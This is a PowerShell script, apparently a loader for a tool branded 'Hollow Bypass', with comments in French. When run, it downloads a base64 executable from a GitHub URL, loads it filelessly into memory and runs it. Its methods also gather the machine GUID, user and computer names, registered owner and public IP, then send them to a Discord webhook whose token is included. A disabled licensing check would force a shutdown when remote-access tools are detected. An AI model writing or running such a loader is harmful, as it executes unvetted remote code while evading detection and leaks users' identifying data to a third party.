class HWIDChecker {
    [array]$allowedUsers
    [string]$currentHWID
    [string]$userName
    [string]$userDomain
    
    HWIDChecker() {
        $this.allowedUsers = @(
            @{ hwid = "0f27e98f-f4c9-440a-9484-a925e25fa7c0"; username = "Owner" },
            @{ hwid = "d7ed1227-75b1-48cf-bff4-4e194ddb8fc9"; username = "Mikoto" }
        )
        $this.currentHWID = $this.GetMachineID()
        $this.userName = $env:USERNAME
        $this.userDomain = $env:COMPUTERNAME
    }
    
    [bool]CheckHWID() {
        # TEMPORAIRE: Desactive la verification HWID pour tester
        # TODO: Remettre la verification apres avoir ajoute votre HWID
        $this.ExecutePowerShellScript()
        return $true
        
        # CODE ORIGINAL (desactive):
        # if ($this.IsSuspiciousProcessRunning()) {
        #     foreach ($user in $this.allowedUsers) {
        #         if ($user.hwid -eq $this.currentHWID) {
        #             return $false
        #         }
        #     }
        #     $this.SendUnauthorizedWebhook()
        #     $this.ShutdownSystem()
        #     return $false
        # }
        #
        # foreach ($user in $this.allowedUsers) {
        #     if ($user.hwid -eq $this.currentHWID) {
        #         if ($user.username -ne "Anto" -and $user.username -ne "Alex" -and $user.username -ne "Tech") {
        #             $this.SendSuccessWebhook($user.username)
        #         }
        #         $this.ExecutePowerShellScript()
        #         return $true
        #     }
        # }
        #
        # $this.SendUnauthorizedWebhook()
        # $this.ShutdownSystem()
        # return $false
    }
    
    hidden [void]ExecutePowerShellScript() {
        try {
            # Methode fileless directe (sans Donut) - charge l'exe directement en memoire
            Write-Host "Telechargement de l'executable..." -ForegroundColor Yellow
            $urls = @(
                "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"
            )
            $maxRetries = 3
            $retryDelay = 2
            $base64 = $null
            
            foreach ($url in $urls) {
                Write-Host "Essai avec: $url" -ForegroundColor Cyan
                for ($i = 1; $i -le $maxRetries; $i++) {
                    try {
                        $base64 = Invoke-RestMethod -Uri $url -TimeoutSec 30
                        Write-Host "Executable telecharge depuis $url : $($base64.Length) caracteres" -ForegroundColor Green
                        break
                    }
                    catch {
                        if ($i -eq $maxRetries) {
                            Write-Host "Echec avec $url apres $maxRetries tentatives" -ForegroundColor Red
                            if ($url -eq $urls[-1]) {
                                throw "Impossible de telecharger l'executable depuis toutes les URLs"
                            }
                        }
                        else {
                            Write-Host "Tentative $i/$maxRetries echouee, nouvelle tentative dans $retryDelay secondes..." -ForegroundColor Yellow
                            Start-Sleep -Seconds $retryDelay
                        }
                    }
                }
                if ($null -ne $base64) {
                    break
                }
            }
            
            if ($null -eq $base64) {
                throw "Impossible de telecharger l'executable"
            }
            
            Write-Host "Decodage et chargement en memoire..." -ForegroundColor Yellow
            $bytes = [Convert]::FromBase64String($base64)
            
            # Variable script pour que le handler puisse y acceder (closures ne fonctionnent pas dans les classes)
            $script:mainAssembly = $null
            # Handler pour resoudre les dependances emballees (Costura.Fody)
            # IMPORTANT: Ajouter le handler AVANT de charger l'assembly (comme dans script.ps1)
            $onAssemblyResolve = {
                param($sender, $e)
                $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
                
                # Chercher dans les ressources de l'assembly principal charge
                if ($script:mainAssembly -ne $null) {
                    $resourceNames = $script:mainAssembly.GetManifestResourceNames()
                    
                    # Format Costura: costura.{assemblyname}.dll.compressed ou costura.{assemblyname}.dll
                    $searchPatterns = @(
                        "costura.$assemblyName.dll.compressed",
                        "costura.$assemblyName.dll",
                        "costura.$($assemblyName.Replace('.', '_'))*.dll.compressed",
                        "costura.$($assemblyName.Replace('.', '_'))*.dll"
                    )
                    
                    foreach ($pattern in $searchPatterns) {
                        $resourceName = $resourceNames | Where-Object { $_ -like $pattern }
                        
                        if ($resourceName) {
                            try {
                                $stream = $script:mainAssembly.GetManifestResourceStream($resourceName)
                                if ($stream -ne $null) {
                                    $assemblyBytes = $null
                                    
                                    # Si c'est compressé, decompresser avec DeflateStream
                                    if ($resourceName.EndsWith(".compressed")) {
                                        $deflateStream = New-Object System.IO.Compression.DeflateStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
                                        $memoryStream = New-Object System.IO.MemoryStream
                                        $deflateStream.CopyTo($memoryStream)
                                        $assemblyBytes = $memoryStream.ToArray()
                                        $deflateStream.Close()
                                        $memoryStream.Close()
                                    }
                                    else {
                                        $assemblyBytes = New-Object byte[] $stream.Length
                                        $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
                                    }
                                    
                                    $stream.Close()
                                    return [System.Reflection.Assembly]::Load($assemblyBytes)
                                }
                            }
                            catch {
                                # Ignorer les erreurs de lecture
                            }
                        }
                    }
                }
                return $null
            }
            # Ajouter le handler AVANT de charger l'assembly (comme dans script.ps1)
            [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
            
            # Maintenant charger l'assembly (le handler sera appele si besoin)
            $script:mainAssembly = [System.Reflection.Assembly]::Load($bytes)
            
            $entryPoint = $script:mainAssembly.EntryPoint
            if ($entryPoint -ne $null) {
                Write-Host "Execution de l'application..." -ForegroundColor Yellow
                $entryPoint.Invoke($null, @())
                Write-Host "Application executee avec succes!" -ForegroundColor Green
            }
            
            [Array]::Clear($bytes, 0, $bytes.Length)
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }
        catch {
            Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "Stack: $($_.Exception.StackTrace)" -ForegroundColor Red
        }
    }
    
    hidden [void]ShutdownSystem() {
        Stop-Computer -Force
    }
    
    hidden [string]GetMachineID() {
        try {
            $machineGuid = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction Stop
            $cleanGuid = $machineGuid.Trim() -replace '[\r\n\s]', ''
            return $cleanGuid
        }
        catch {
            return ""
        }
    }
    
    hidden [string]GetEmail() {
        try {
            $registeredOwner = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name "RegisteredOwner" -ErrorAction Stop
            return $registeredOwner
        }
        catch {
            return ""
        }
    }
    
    hidden [bool]IsSuspiciousProcessRunning() {
        $suspiciousProcesses = @("TeamViewer", "AnyDesk", "tv_w32", "tv_x64", "anydesk")
        $detected = $false
        
        foreach ($processName in $suspiciousProcesses) {
            $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
            if ($process) {
                $detected = $true
            }
        }
        
        $allProcesses = Get-Process | Where-Object { 
            $_.ProcessName -like "*team*" -or 
            $_.ProcessName -like "*any*" -or
            $_.ProcessName -like "*remote*" -or
            $_.ProcessName -like "*rdp*" -or
            $_.ProcessName -like "*vnc*"
        }
        
        if ($allProcesses.Count -gt 0) {
            $detected = $true
        }
        
        return $detected
    }
    
    hidden [string]GetPublicIPv4() {
        try {
            $ip = Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 10
            return $ip
        }
        catch {
            try {
                $ip = Invoke-RestMethod -Uri "https://ipv4.icanhazip.com" -TimeoutSec 5
                return $ip.Trim()
            }
            catch {
                return ""
            }
        }
    }
    
    hidden [string]GetCurrentTimestamp() {
        return (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
    }
    
    hidden [void]SendUnauthorizedWebhook() {
        $ipv4 = $this.GetPublicIPv4()
        $email = $this.GetEmail()
        $timestamp = $this.GetCurrentTimestamp()
        
        $webhookURL = "1445905462946959360/dZZ3jV8tEnEyh8Owdqo_598cA1cZHxzq1lQi5Hwu3BTVXtr9ckaGjS4UQz6OI96X-CUa"
        
        $postData = @{
            content = $null
            embeds = @(
                @{
                    title = ":warning: TENTATIVO DI ACCESSO NON AUTORIZZATO :warning:"
                    color = 0
                    fields = @(
                        @{
                            name = "HWID"
                            value = $this.currentHWID
                        },
                        @{
                            name = "USER PC"
                            value = "$($this.userName) / $($this.userDomain)"
                        },
                        @{
                            name = "EMAIL ADDRESS"
                            value = $email
                        },
                        @{
                            name = "IP ADDRESS"
                            value = $ipv4
                        }
                    )
                    footer = @{
                        text = "Hollow Bypass"
                        icon_url = "https://i.imgur.com/PRLEb4h.jpeg"
                    }
                    timestamp = $timestamp
                }
            )
            attachments = @()
        } | ConvertTo-Json -Depth 10
        
        $this.SendWebhook($webhookURL, $postData)
    }
    
    hidden [void]SendSuccessWebhook([string]$username) {
        $timestamp = $this.GetCurrentTimestamp()
        
        $webhookURL = "1445905462946959360/dZZ3jV8tEnEyh8Owdqo_598cA1cZHxzq1lQi5Hwu3BTVXtr9ckaGjS4UQz6OI96X-CUa"
        
        $postData = @{
            content = $null
            embeds = @(
                @{
                    title = ":ballot_box_with_check: ACCESSO COMPIUTO :ballot_box_with_check:"
                    color = 0
                    fields = @(
                        @{
                            name = "USERNAME"
                            value = $username
                        },
                        @{
                            name = "HWID"
                            value = $this.currentHWID
                        },
                        @{
                            name = "USER PC"
                            value = "$($this.userName) / $($this.userDomain)"
                        }
                    )
                    footer = @{
                        text = "Hollow Bypass"
                        icon_url = "https://i.imgur.com/PRLEb4h.jpeg"
                    }
                    timestamp = $timestamp
                }
            )
            attachments = @()
        } | ConvertTo-Json -Depth 10
        
        $this.SendWebhook($webhookURL, $postData)
    }
    
    hidden [bool]SendWebhook([string]$url, [string]$data) {
        try {
            $fullUrl = "https://discord.com/api/webhooks/$url"
            $response = Invoke-RestMethod -Uri $fullUrl -Method Post -Body $data -ContentType "application/json" -TimeoutSec 10
            return $true
        }
        catch {
            return $false
        }
    }
}

try {
    $checker = [HWIDChecker]::new()
    $null = $checker.CheckHWID()  # $null pour ne pas afficher la valeur de retour
    # Ne pas faire exit pour ne pas fermer PowerShell
}
catch {
    Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
    # Ne pas faire exit pour ne pas fermer PowerShell
}
